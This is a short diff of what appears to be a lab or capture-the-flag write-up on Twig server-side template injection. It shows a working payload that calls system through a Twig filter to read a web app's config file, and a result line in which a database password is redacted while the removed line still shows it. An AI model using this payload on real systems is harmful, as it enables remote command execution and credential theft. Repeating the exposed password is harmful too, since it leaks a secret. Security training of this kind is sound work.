@@ -22,7 +22,7 @@ Exploit a Server-Side Template Injection vulnerability in the Twig template engi
 
 GET /search?q={{['cat /var/www/html/config.php']|filter('system')}} HTTP/1.1
 Host: true-scream.apac01.hackviser.space
-Result: Executed cat /var/www/html/config.php via system filter, revealing database password: kfqEnLyBrT2JaS
+Result: Executed cat /var/www/html/config.php via system filter, revealing database password: [REDACTED]
 
 ## 🛡️ Mitigation Strategies
 Template Engine Configuration: Disable dangerous filters/functions in Twig
